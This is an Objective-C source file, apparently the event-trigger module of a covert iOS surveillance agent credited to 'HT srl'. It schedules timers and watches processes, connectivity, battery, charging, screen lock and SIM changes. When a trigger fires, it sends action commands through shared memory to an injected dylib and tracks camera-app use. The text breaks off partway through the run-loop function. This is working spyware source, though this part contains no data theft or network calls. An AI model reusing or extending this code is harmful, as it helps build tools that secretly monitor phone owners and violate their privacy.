/*
 * RCSIpony - Events
 *  Provides all the events which should trigger an action
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 26/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CoreFoundation/CoreFoundation.h>
#include <SystemConfiguration/SystemConfiguration.h>

#include <sys/param.h>
#include <sys/queue.h>
#include <sys/socket.h>

#import "RCSIEvents.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"
#import "RCSISharedMemory.h"
#import "RCSIActions.h"
#import "Reachability.h"
#import "RCSIEventTimer.h"
#import "RCSIEventProcess.h"
#import "RCSIEventConnectivity.h"
#import "RCSIEventBattery.h"
#import "RCSIEventACPower.h"
#import "RCSIEventScreensaver.h"
#import "RCSIEventSimChange.h"

#define JSON_CONFIG

#define DEBUG_

NSString *kRunLoopEventManagerMode = @"kRunLoopEventManagerMode";

#pragma mark -
#pragma mark Events Data Struct Definition
#pragma mark -

//
// struct for events data
//
typedef struct _timer {
  u_int type;
  u_int loDelay;
  u_int hiDelay;
  u_int endAction;
} timerStruct;

typedef struct _process {
  u_int onClose;
  u_int lookForTitle; // 1 for Title - 0 for Process Name
  u_int nameLength;
  char name[256];     // Name is unicode here
} processStruct;

typedef struct _connection {
  u_int onClose;
  u_long typeOfConnection; // 1 for Wifi - 2 for GPRS - 3 for WiFI || GPRS
} connectionStruct;

typedef struct _smsEvent {
  u_int phoneNumberLength;  // cString Length
  NSString *phoneNumber;    // Unicode
  u_int smsTextLength;      // cString Length
  NSString *smsText;        // Unicode
} smsStruct;

typedef struct _call {
  u_int onClose;
  u_int phoneNumberLength; // cString Length
  NSString *phoneNumber;   // Unicode
} callStruct;

typedef struct _simChange {
  u_int onClose;
} simChangeStruct;

typedef struct _ac {
  u_int onClose;
} acStruct;

typedef struct _batteryLevel {
  u_int onClose;
  u_int minLevel;
  u_int maxLevel;
} batteryLevelStruct;

extern RCSISharedMemory *mSharedMemoryCommand;
static RCSIEvents *sharedInstance = nil;
static BOOL gConnectionFound = FALSE;

NSLock *connectionLock;

@implementation RCSIEvents : RCSIEventsSupport

@synthesize notificationPort;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIEvents *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedInstance;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedInstance == nil)
      {
        sharedInstance = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedInstance;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
  if (sharedInstance != nil)
    {
      self = [super init];
    
    if (self != nil)
      {
        mEventsMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
        notificationPort = nil;
      }
    
      sharedInstance = self;
    }
  }
  
  return sharedInstance;
}


- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Events monitor routines
#pragma mark -


- (NSDate*)calculateDateFromMidnight:(NSTimeInterval)aInterval
{
  NSRange fixedRange;
  fixedRange.location = 11;
  fixedRange.length   = 8;
  
  //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
  // UTC timers
  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
  
  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
  [inFormat setTimeZone:timeZone];
  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Get current date string UTC
  NSDate *now = [NSDate date];
  NSString *currDateStr = [inFormat stringFromDate: now];
  
  [inFormat release];
  
  // Create string from current date: yyyy-MM-dd hh:mm:ss ZZZ
  NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
  
  // reset current date time to midnight
  [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
  
  NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
  [outFormat setTimeZone:timeZone];
  [outFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Current midnite
  NSDate *midnight = [outFormat dateFromString: dayStr];
  
  //XXX- ios4.0 >
  NSDate *dateFromMidnite = (NSDate*)[NSDate dateWithTimeInterval: aInterval sinceDate: midnight];
  
  return  dateFromMidnite;
}

- (void)addEventTimerInstance:(NSMutableDictionary*)theEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSIEventTimer *timer = [[RCSIEventTimer alloc] init];
  
  [theEvent retain];
  
  timerStruct *timerRawData = (timerStruct *)[[theEvent objectForKey: @"data"] bytes];

  int type          = timerRawData->type;
  uint low          = timerRawData->loDelay;
  uint high         = timerRawData->hiDelay;
  
  [timer setEnabled:[theEvent objectForKey: @"enabled"]];
  [timer setStart: [theEvent objectForKey: @"start"]];
  [timer setRepeat: [theEvent objectForKey: @"repeat"]];
  [timer setEnd: [theEvent objectForKey: @"end"]];
  [timer setIter: [theEvent objectForKey: @"iter"]];
  [timer setDelay: [theEvent objectForKey:@"delay"]];
  
  [timer setTimerType: type];
  
  switch (type) 
  {
    case TIMER_LOOP:
    {
      break;
    } 
    case TIMER_AFTER_STARTUP:
    {
      // timer with startDate only
      if (low != 0xFFFFFFFF)
        [timer setStartDate: [NSDate dateWithTimeIntervalSinceNow:(low/1000)]];
      break;
    } 
    case TIMER_INST:
    {
      int64_t high64 = high;
      int64_t sec = ((high64 << 32) & 0xFFFFFFFF00000000) + low;
      sec /= 10000000LL;

      NSString *execName = [[NSBundle mainBundle] bundlePath];
      NSDictionary *execProps = [[NSFileManager defaultManager] attributesOfItemAtPath: execName error:nil]; 
      NSDate *execCreationDate = [execProps objectForKey:NSFileCreationDate];
      NSTimeInterval execCreationInterval = [execCreationDate timeIntervalSince1970];
      
      // timer with startDate only
      [timer setStartDate: [NSDate dateWithTimeIntervalSince1970: execCreationInterval + sec]];
      break;
    }
    case TIMER_DATE:
    {
      int64_t winTime;
      int64_t high64 = high;
      winTime = ((high64 << 32) & 0xFFFFFFFF00000000) + low;
      NSTimeInterval unixTime;      
      unixTime = (winTime - EPOCH_DIFF)/RATE_DIFF;
      
      // timer with startDate only
      [timer setStartDate: [NSDate dateWithTimeIntervalSince1970: unixTime]];
      break;
    }
    case TIMER_DAILY:
    {
      [timer setStartDate: [self calculateDateFromMidnight: low/1000]];
      [timer setEndDate: [self calculateDateFromMidnight: high/1000]];
      break;
    }
    default:
      break;
  }
  
  [theEvent setObject: timer forKey: @"object"];

  [theEvent release];
  [timer release];
  
  [pool release];
}

- (void)addEventProcessInstance:(NSMutableDictionary*)theEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSIEventProcess *proc = [[RCSIEventProcess alloc] init];
  
  [theEvent retain];

  processStruct *processRawData = (processStruct *)[[theEvent objectForKey: @"data"] bytes];
  
  NSData *tempData  = [NSData dataWithBytes: processRawData->name
                                     length: processRawData->nameLength];
  
  NSString *processName = [[NSString alloc] initWithData: tempData
                                                encoding: NSUTF16LittleEndianStringEncoding];

  [proc setProcessName: processName];
  
  [proc setEnabled:[theEvent objectForKey: @"enabled"]];
  [proc setStart: [theEvent objectForKey: @"start"]];
  [proc setRepeat: [theEvent objectForKey: @"repeat"]];
  [proc setEnd: [theEvent objectForKey: @"end"]];
  [proc setIter: [theEvent objectForKey: @"iter"]];
  [proc setDelay: [theEvent objectForKey:@"delay"]]; 

  [theEvent setObject: proc forKey: @"object"];

  [processName release];
  [theEvent release];
  [proc release];
  
  [pool release];
}

- (void)addEventConnectivityInstance:(NSMutableDictionary*)theEvent
{
  RCSIEventConnectivity *conn = [[RCSIEventConnectivity alloc] init];
  
  [theEvent retain];
    
  [conn setEnabled:[theEvent objectForKey: @"enabled"]];
  [conn setStart: [theEvent objectForKey: @"start"]];
  [conn setRepeat: [theEvent objectForKey: @"repeat"]];
  [conn setEnd: [theEvent objectForKey: @"end"]];
  [conn setIter: [theEvent objectForKey: @"iter"]];
  [conn setDelay: [theEvent objectForKey:@"delay"]]; 
  
  [theEvent setObject: conn forKey: @"object"];
  
  [theEvent release];
  
  [conn release];
}

- (void)addEventBatteryInstance:(NSMutableDictionary*)theEvent
{
  RCSIEventBattery *batt = [[RCSIEventBattery alloc] init];
  
  [theEvent retain];
  
  batteryLevelStruct *batteryRawData = (batteryLevelStruct *)[[theEvent objectForKey: @"data"] bytes];
   
  [batt setEnabled:[theEvent objectForKey: @"enabled"]];
  [batt setStart: [theEvent objectForKey: @"start"]];
  [batt setRepeat: [theEvent objectForKey: @"repeat"]];
  [batt setEnd: [theEvent objectForKey: @"end"]];
  [batt setIter: [theEvent objectForKey: @"iter"]];
  [batt setDelay: [theEvent objectForKey:@"delay"]]; 
  
  [batt setMinLevel: batteryRawData->minLevel];
  [batt setMaxLevel: batteryRawData->maxLevel];
  
  [theEvent setObject: batt forKey: @"object"];
  
  [theEvent release];
  
  [batt release];
}

- (void)addEventACInstance:(NSMutableDictionary*)theEvent
{
  RCSIEventACPower *ac = [[RCSIEventACPower alloc] init];
  
  [theEvent retain];
  
  [ac setEnabled:[theEvent objectForKey: @"enabled"]];
  [ac setStart: [theEvent objectForKey: @"start"]];
  [ac setRepeat: [theEvent objectForKey: @"repeat"]];
  [ac setEnd: [theEvent objectForKey: @"end"]];
  [ac setIter: [theEvent objectForKey: @"iter"]];
  [ac setDelay: [theEvent objectForKey:@"delay"]];  
  
  [theEvent setObject: ac forKey: @"object"];
  
  [theEvent release];
  
  [ac release];
}

- (void)addEventScreensaverInstance:(NSMutableDictionary*)theEvent
{
  RCSIEventScreensaver *scrsvr = [[RCSIEventScreensaver alloc] init];
  
  [theEvent retain];
  
  [scrsvr setEnabled:[theEvent objectForKey: @"enabled"]];
  [scrsvr setStart: [theEvent objectForKey: @"start"]];
  [scrsvr setRepeat: [theEvent objectForKey: @"repeat"]];
  [scrsvr setEnd: [theEvent objectForKey: @"end"]];
  [scrsvr setIter: [theEvent objectForKey: @"iter"]];
  [scrsvr setDelay: [theEvent objectForKey:@"delay"]];  
  
  [theEvent setObject: scrsvr forKey: @"object"];
  
  [theEvent release];
  
  [scrsvr release];
}

- (void)addEventSimChangeInstance:(NSMutableDictionary*)theEvent
{
  RCSIEventSimChange *sim = [[RCSIEventSimChange alloc] init];
  
  [theEvent retain];
  
  [sim setEnabled:[theEvent objectForKey: @"enabled"]];
  [sim setStart: [theEvent objectForKey: @"start"]];
  [sim setRepeat: [theEvent objectForKey: @"repeat"]];
  [sim setEnd: [theEvent objectForKey: @"end"]];
  [sim setIter: [theEvent objectForKey: @"iter"]];
  [sim setDelay: [theEvent objectForKey:@"delay"]];  
  
  [theEvent setObject: sim forKey: @"object"];
  
  [theEvent release];
  
  [sim release];
}

///////////////////////////////////////////////////
// Events running on separated thread

- (void)eventTimer: (NSDictionary *)theEvent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL timerDailyTriggered = NO;
  
  NSTimeInterval interval = 0;
  [theEvent retain];
  
  timerStruct *timerRawData = (timerStruct *)[[theEvent objectForKey: @"data"] bytes];
  
  int actionID      = [[theEvent objectForKey: @"actionID"] intValue];
  int type          = timerRawData->type;
  uint low          = timerRawData->loDelay;
  uint high         = timerRawData->hiDelay;
  uint endActionID  = timerRawData->endAction;
  
  NSDate *startThreadDate = [NSDate date];
  
  while ([theEvent objectForKey: @"status"] != EVENT_STOP && 
         [theEvent objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      switch (type)
        {
        case TIMER_AFTER_STARTUP:
          {
            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
            
            //NSLog(@"interval: %lf", fabs(interval));
            if (fabs(interval) >= low / 1000)
              {
                [self triggerAction: actionID];
                
                // exit after triggering action 
                [theEvent setValue: EVENT_STOP forKey: @"status"];
              }
            
            break;
          }
        case TIMER_LOOP:
          {
            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
            
            if (fabs(interval) >= low / 1000)
              {
                //XXX-
                startThreadDate = [[NSDate date] retain];
                
                [self triggerAction: actionID];
              }
            
            break;
          }
        case TIMER_DATE:
          {
            int64_t configuredDate = 0;
            configuredDate = ((int64_t)high << 32) | (int64_t)low;

            int64_t unixDate = (configuredDate - EPOCH_DIFF) / RATE_DIFF;            
            NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: unixDate];
            NSDate *now = [NSDate date];
            
            if ([[now laterDate: givenDate] isEqual: now])
              {             
                [self triggerAction: actionID];
                
                // exit from loop and terminate thread
                [theEvent setValue: EVENT_STOPPED forKey: @"status"];
              }
            
            break;
          }
        case TIMER_INST:
          {
            int64_t configuredDate = 0;
            // 100-nanosec unit from installation date
            configuredDate = ((int64_t)high << 32) | (int64_t)low;
            // seconds unit from installation date
            configuredDate = configuredDate*(0.0000001);
            
            NSDictionary *bundleAttrib =
            [[NSFileManager defaultManager] attributesOfItemAtPath: [[NSBundle mainBundle] executablePath]          
                                                             error: nil]; 
            
            NSDate *creationDate = [bundleAttrib objectForKey: NSFileCreationDate];
            
            if (creationDate == nil)
              break;
            
            NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
                   
            NSDate *now = [NSDate date];
            
            if ([[now laterDate: givenDate] isEqualToDate: now])
            {
              [self triggerAction: actionID];
              
              // exit after triggering the actions
              [theEvent setValue: EVENT_STOPPED forKey: @"status"];
            }
            
            break;
          }
        case TIMER_DAILY:
          {
            //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
            NSDate *now = [NSDate date];
            
            NSRange fixedRange;
            fixedRange.location = 11;
            fixedRange.length   = 8;
            
            // UTC timers
            NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
            
            NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
            [inFormat setTimeZone:timeZone];
            [inFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
            
            // Get current date string UTC
            NSString *currDateStr = [inFormat stringFromDate: now];
            [inFormat release];
            NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
    
            // Set current date time to midnight
            [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
 
            NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
            [outFormat setTimeZone:timeZone];
            [outFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
            
            // Current midnite
            NSDate *dayDate = [outFormat dateFromString: dayStr];
            [outFormat release];

            [dayStr release];
            
            NSDate *highDay = [dayDate addTimeInterval: (high/1000)];
            NSDate *lowDay = [dayDate addTimeInterval: (low/1000)];
          
                       
            if (timerDailyTriggered == NO &&
                [[now laterDate: lowDay] isEqualToDate: now] &&
                [[now earlierDate: highDay] isEqualToDate: now])
            {
              [self triggerAction: actionID];
              
              timerDailyTriggered = YES;
              
            } 
            else if (timerDailyTriggered == YES && 
                     ([[now laterDate: highDay] isEqualToDate: now]||
                      [[now earlierDate: lowDay] isEqualToDate: now] ))
            {
              [self triggerAction: endActionID];
              
              timerDailyTriggered = NO;
            }
            
            break;
          }
        default:
          {
            [innerPool release];
            [outerPool release];
            // stop and exit...
            [theEvent setValue: EVENT_STOPPED forKey: @"status"];
            [theEvent release];
            [NSThread exit];
          }
        }
      
      usleep(300000);
      
      [innerPool release];
    }
  
  // stop the status (readed by stopEvents)
  if ([[theEvent objectForKey: @"status"] isEqualToString: EVENT_STOP])
      [theEvent setValue: EVENT_STOPPED forKey: @"status"];
  
  [theEvent release];
  
  [outerPool release];
}

- (void)eventProcess: (NSDictionary *)theEvent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // Process name on iphone max size = 16
  [theEvent retain];
  
  int processAlreadyFound = 0;
  processStruct *processRawData = (processStruct *)[[theEvent objectForKey: @"data"] bytes];
  
  int actionID      = [[theEvent objectForKey: @"actionID"] intValue];
  int onTermination = processRawData->onClose;
  int lookForTitle  = processRawData->lookForTitle;
  int nameLength    = processRawData->nameLength;
  
  NSData *tempData  = [NSData dataWithBytes: processRawData->name
                                     length: nameLength];
  
  NSString *process = [[NSString alloc] initWithData: tempData
                                            encoding: NSUTF16LittleEndianStringEncoding];

  while ([theEvent objectForKey: @"status"] != EVENT_STOP &&
         [theEvent objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      switch (lookForTitle)
        {
        case PROCESS:
          {
            if (processAlreadyFound != 0 && findProcessWithName(process) == NO)
              {
                processAlreadyFound = 0;
                
                if (onTermination != -1)
                  {
                    [self triggerAction: onTermination];
                  }
              }
            else if (processAlreadyFound == 0 && findProcessWithName(process) == YES)
              {
                processAlreadyFound = 1; 
                [self triggerAction: actionID];
              }
            break;
          }
        default:
          break;
        }
      
      [innerPool release];
    
      usleep(300000);
    }

  if ([[theEvent objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
      [theEvent setValue: EVENT_STOPPED forKey: @"status"];
    }
  
  [process release];
  
  [theEvent release];
        
  [outerPool release];
}

- (void)eventConnection: (NSDictionary *)theEvent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [theEvent retain];
  
  connectionStruct *connectionRawData = (connectionStruct *)[[theEvent objectForKey: @"data"] bytes];

  int actionID      = [[theEvent objectForKey: @"actionID"] intValue];
  int onTermination = connectionRawData->onClose;
  
  while ([theEvent objectForKey: @"status"] != EVENT_STOP &&
         [theEvent objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      Reachability *reachability   = [Reachability reachabilityForInternetConnection];
      NetworkStatus internetStatus = [reachability currentReachabilityStatus];
  
      if (internetStatus != NotReachable)
        {
          if (gConnectionFound == FALSE)
            {
              gConnectionFound = TRUE;
              [self triggerAction: actionID];
            }
        }
      else
        {
          if (gConnectionFound == TRUE)
            {
              gConnectionFound = FALSE;
              if (onTermination != -1)
                {
                  [self triggerAction: onTermination];
                }
            }
        }
        
      [innerPool release];
    
      usleep(300000);
    }
  
  if ([[theEvent objectForKey: @"status"] isEqualToString: EVENT_STOP])
      [theEvent setValue: EVENT_STOPPED forKey: @"status"];
        
  [theEvent release];
  
  [outerPool release];
}

- (void)eventBattery: (NSDictionary *)theEvent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  [theEvent retain];
  
  UIDevice  *uiDev = [UIDevice currentDevice];
  
  batteryLevelStruct *processRawData = (batteryLevelStruct *)[[theEvent objectForKey: @"data"] bytes];
  
  NSNumber *actionID = [theEvent objectForKey: @"actionID"];
  int minLevel      = processRawData->minLevel;
  int maxLevel      = processRawData->maxLevel;
  
  if ([theEvent objectForKey: @"status"]  != EVENT_STOP && 
      [theEvent objectForKey: @"status"]  != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      if ([uiDev isBatteryMonitoringEnabled] == FALSE)
        uiDev.batteryMonitoringEnabled = TRUE;
        
      float battLevel = [[UIDevice currentDevice] batteryLevel] * 100;
          
#ifdef DEBUG
    NSLog(@"%s: battery min %d, max %d, curr %f", __FUNCTION__, minLevel, maxLevel, battLevel);
#endif

      if (minLevel <= battLevel &&  battLevel <= maxLevel) 
        {
#ifdef DEBUG
          NSLog(@"%s: battery event trigger action id %d", __FUNCTION__, [actionID intValue]);
#endif
          [self triggerAction: [actionID intValue]];
        }
    
      // runloop necessary for receive batterylevel update
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.300]];
      
      [innerPool release];
    }
  
  if ([[theEvent objectForKey: @"status"] isEqualToString: EVENT_STOP])
    [theEvent setValue: EVENT_STOPPED forKey: @"status"];
    
  [theEvent release];
  [outerPool release];
}

- (void)eventACStatus: (NSDictionary *)theEvent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [theEvent retain];
  
  UIDevice  *uiDev = [UIDevice currentDevice];
   
  NSNumber *actionID = [theEvent objectForKey: @"actionID"];
  
  if ([theEvent objectForKey: @"status"] != EVENT_STOP && 
      [theEvent objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      if ([uiDev isBatteryMonitoringEnabled] == FALSE)
        uiDev.batteryMonitoringEnabled = TRUE;
      
      UIDeviceBatteryState battState = [[UIDevice currentDevice] batteryState];
    
      if (battState == UIDeviceBatteryStateCharging || battState == UIDeviceBatteryStateFull) 
        {
#ifdef DEBUG
          NSLog(@"%s: battery event trigger action id %d", __FUNCTION__, [actionID intValue]);
#endif
          [self triggerAction: [actionID intValue]];
        }
    
      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.300]];
      
      [innerPool release];
    }
  
  if ([[theEvent objectForKey: @"status"] isEqualToString: EVENT_STOP])
    [theEvent setValue: EVENT_STOPPED forKey: @"status"];
    
  [theEvent release];
  [outerPool release];
}

- (void)eventStandBy: (NSDictionary *)theEvent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
  
  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
  shMemoryHeader->agentID         = OFFT_STANDBY;
  shMemoryHeader->direction       = D_TO_AGENT;
  shMemoryHeader->command         = AG_START;
  shMemoryHeader->commandDataSize = sizeof(standByStruct);

  standByStruct tmpStruct;
  
  tmpStruct.actionOnLock    = [[theEvent objectForKey: @"actionID"] intValue];
  
  if ([theEvent objectForKey: @"data"])
    memcpy(&tmpStruct.actionOnUnlock, [[theEvent objectForKey: @"data"] bytes], sizeof(UInt32));
  else
    tmpStruct.actionOnUnlock = CONF_ACTION_NULL;
  
  memcpy(shMemoryHeader->commandData, &tmpStruct, sizeof(tmpStruct));

  
  if ([mSharedMemoryCommand writeMemory: standByCommand
                                 offset: OFFT_STANDBY
                          fromComponent: COMP_CORE])
    {
#ifdef DEBUG
      NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
#endif
    }
  else 
    {
#ifdef DEBUG
      NSLog(@"%s: sending standby command to dylib: error!", __FUNCTION__);
#endif
    }
  
  [standByCommand release]; 
  
  [outerPool release];
}

- (void)eventSimChange: (NSDictionary *)theEvent
{
  NSMutableData *simChangeCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
  
  int actionID = [[theEvent objectForKey: @"actionID"] intValue];
  
  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[simChangeCommand bytes];
  shMemoryHeader->agentID         = OFFT_SIMCHG;
  shMemoryHeader->direction       = D_TO_AGENT;
  shMemoryHeader->command         = AG_START;
  shMemoryHeader->commandDataSize = sizeof(int);
  memcpy(shMemoryHeader->commandData, &actionID, sizeof(int));
           
  if ([mSharedMemoryCommand writeMemory: simChangeCommand
                                 offset: OFFT_SIMCHG
                          fromComponent: COMP_CORE])
    {
#ifdef DEBUG_
      NSLog(@"%s: sending simChange command to dylib: done!", __FUNCTION__);
#endif
    }
  else 
    {
#ifdef DEBUG
      NSLog(@"%s: sending simChange command to dylib: error!", __FUNCTION__);
#endif
    }
  
  [simChangeCommand release]; 
}

- (void)startEventStandBy: (int)theEventPos
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
  
  standByStruct tmpStruct;
  
  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
  shMemoryHeader->agentID         = OFFT_STANDBY;
  shMemoryHeader->direction       = D_TO_AGENT;
  shMemoryHeader->command         = AG_START;
  shMemoryHeader->commandDataSize = sizeof(standByStruct);
  
  tmpStruct.actionOnLock = theEventPos;
  tmpStruct.actionOnUnlock = theEventPos;
  
  memcpy(shMemoryHeader->commandData, &tmpStruct, sizeof(tmpStruct));
  
  if ([mSharedMemoryCommand writeMemory: standByCommand
                                 offset: OFFT_STANDBY
                          fromComponent: COMP_CORE])
    {
#ifdef DEBUG
    NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
#endif
    }
  else 
    {
#ifdef DEBUG
    NSLog(@"%s: sending standby command to dylib: error!", __FUNCTION__);
#endif
    }
  
  [standByCommand release]; 
  
  [outerPool release];
}

///////////////////////////////////////////////////

#pragma mark -
#pragma mark Main runloop
#pragma mark -

///////////////////////////////////////////////////

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

- (BOOL)triggerAction: (int)anActionID
{
  if (anActionID == 0xFFFFFFFF)
    return FALSE;
  
  NSData *theMsg = [[NSData alloc] initWithBytes: &anActionID length:sizeof(int)];
  
  mach_port_t port = [[[RCSIActions sharedInstance] notificationPort] machPort];
  
  [RCSISharedMemory sendMessageToMachPort:port withData:theMsg];
  
  [theMsg release];
  
  return TRUE;
}

- (BOOL)addMessage: (NSData*)aMessage
{
  // messages removed by handleMachMessage
  @synchronized(mEventsMessageQueue)
  {
    [mEventsMessageQueue addObject: aMessage];
  }
  
  return TRUE;
}

// handle the incomings events
- (void) handleMachMessage:(void *) msg 
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  coreMessage_t *coreMsg = (coreMessage_t*)msg;
  
  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))  
                                   length: coreMsg->dataLen];
  
  [self addMessage: theData];
  
  [pool release];
}

- (BOOL)processNewEvent:(NSData *)aData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (aData == nil)
    return FALSE;
    
  shMemoryLog *anEvent = (shMemoryLog*)[aData bytes];
  
  switch (anEvent->agentID) 
  {
    case EVENT_CAMERA_APP:
    {
      gCameraActive = anEvent->flag == 1 ? TRUE : FALSE;
      break;
    } 
    case EVENT_STANDBY:
    {
#ifdef  JSON_CONFIG
    int eventID = anEvent->flag;
    
    NSMutableArray *eventList = [[RCSITaskManager sharedInstance] getCopyOfEvents];  
  
    NSMutableDictionary *theEvent = [eventList objectAtIndex: eventID];
      
    id eventInst = [theEvent objectForKey: @"object"];
      
    if (eventInst != nil && [eventInst respondsToSelector:@selector(setStandByTimer)])
      {
        [eventInst performSelector:@selector(setStandByTimer)];
        [theEvent setObject:EVENT_START forKey:@"status"];
        
        // release it [retained by addTimersToCurrentRunLoop]
        //[eventInst retain];
      }
    
    [eventList release];
    
#else
      [self triggerAction: anEvent->flag];
#endif
      break;
    }
    case EVENT_SIM_CHANGE:
    {
      [self triggerAction: anEvent->flag];
      break;
    }
    default:
      break;
  }
  
  [pool release];
  
  return TRUE;
}

// Process new incoming events
-(int)processIncomingEvents
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpMessages;
  
  @synchronized(mEventsMessageQueue)
  {
    tmpMessages = [[mEventsMessageQueue copy] autorelease];
    [mEventsMessageQueue removeAllObjects];
  }
  
#ifdef DEBUG
  NSLog(@"%s: process messages %d", __FUNCTION__, [tmpMessages count]);
#endif  
  
  int logCount = [tmpMessages count];
  
  for (int i=0; i < logCount; i++)
    {
      [self processNewEvent: [tmpMessages objectAtIndex:i]];
    }
  
  [pool release];
  
  return logCount;
}

- (void)removeTimersFromCurrentRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *eventList = [[RCSITaskManager sharedInstance] getCopyOfEvents];  
  
  for (int i=0; i < [eventList count]; i++) 
    {
      NSMutableDictionary *theEvent = [eventList objectAtIndex:i];
      
      id eventInst = [theEvent objectForKey: @"object"];
      
      if (eventInst != nil && [eventInst respondsToSelector:@selector(removeTimers)])
        {
          [eventInst performSelector:@selector(removeTimers)];
          //[theEvent setObject:EVENT_STOPPED forKey:@"status"];
          
          // release it [retained by addTimersToCurrentRunLoop]
          //[eventInst release];
        }
    }
  
  [eventList release];
  
  [pool release];
}

- (void)addTimersToCurrentRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *eventList = [[RCSITaskManager sharedInstance] getCopyOfEvents];  
  
  for (int i=0; i < [eventList count]; i++) 
  {
    NSMutableDictionary *theEvent = [eventList objectAtIndex:i];
    
    id eventInst = [theEvent objectForKey: @"object"];
    
    if (eventInst != nil && [eventInst respondsToSelector:@selector(setStartTimer)])
      {
        [eventInst performSelector:@selector(setStartTimer)];
        //[theEvent setObject:EVENT_START forKey:@"status"];
        
        // for timing issues, maybe races on reloading the configuration
        // retain it for safety
        //[eventInst retain];
      }
  }
  
  [eventList release];
  
  [pool release];
}

- (void)eventManagerRunLoop
{
#ifdef DEBUG_   
  NSLog(@"%s: running event manager", __FUNCTION__);
#endif 

  while (eventManagerStatus == EVENT_MANAGER_RUNNING &&
         eventManagerStatus == EVENT_MANAGER_STOPPING)
    { 
#ifdef DEBUG
        NSLog(@"%s: eventManagerRunLoop found alredy running", __FUNCTION__);
#endif
      sleep(1);
    }
    
  eventManagerStatus = EVENT_MANAGER_RUNNING;
  
  NSRunLoop *eventManagerRunLoop = [NSRunLoop currentRunLoop];
  
  notificationPort = [[NSMachPort alloc] init];
  [notificationPort setDelegate: self];
  
  [eventManagerRunLoop addPort: notificationPort 
                       forMode: kRunLoopEventManagerMode];
  
